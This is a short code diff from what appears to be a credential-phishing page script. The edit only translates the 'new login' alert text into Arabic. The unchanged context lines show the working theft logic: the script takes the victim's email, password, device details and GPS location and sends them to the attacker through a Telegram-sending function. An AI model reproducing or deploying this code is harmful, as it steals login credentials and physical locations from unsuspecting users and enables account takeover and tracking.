@@ -89,7 +89,7 @@
                     let longitude = position.coords.longitude;
                     let locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-                    let message = `🚀 new login :
+                    let message = `🚀 تسجيل دخول جديد:
 📧 The email  :  ${email}
 🔑 The passwd :  ${password}
 📱 The Advise :  ${deviceInfo}
@@ -97,7 +97,7 @@
 
                     sendMessageToTelegram(message);
                 }, () => {
-                    let message = `🚀 new login :
+                    let message = `🚀 تسجيل دخول جديد:
 📧 The email  :  ${email}
 🔑 The passwd :  ${password}
 📱 The Advise :  ${deviceInfo}
@@ -106,7 +106,7 @@
                     sendMessageToTelegram(message);
                 });
             } else {
-                let message = '🚀 new login:
+                    let message = `🚀 تسجيل دخول جديد:
 📧 The email  :  ${email}
 🔑 The passwd :  ${password}
 📱 The Advise :  ${deviceInfo}
